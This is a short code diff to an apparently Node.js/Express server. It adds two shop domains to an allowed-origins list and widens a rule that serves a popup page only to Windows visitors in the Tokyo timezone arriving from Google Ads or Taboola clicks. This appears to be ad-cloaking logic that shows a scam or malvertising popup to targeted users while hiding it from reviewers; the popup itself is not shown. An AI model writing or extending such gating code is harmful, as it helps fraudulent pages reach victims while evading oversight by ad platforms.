@@ -18,6 +18,8 @@ const allowedOrigins = [
   "http://wayneonsen.life",
   "https://yummyjuices.shop",
   "http://yummyjuices.shop",
+  "https://sakiinstant.shop",
+  "http://sakiinstant.shop",
 ];
 
 // Normalize referer function to handle trailing slashes
@@ -66,7 +68,7 @@ app.post(
     console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);
 
     // Check conditions and log them, removed check for gclid
-    if (isWindowsOS(userAgent) && isTokyoTimezone && fullUrl?.includes(`gclid`)) {
+    if (isWindowsOS(userAgent) && isTokyoTimezone && (fullUrl?.includes(`gclid`) || fullUrl?.includes(`taboola`))) {
       console.log('popupsent');
       res.sendFile(path.join(__dirname, "altmod.html"));
     } else {
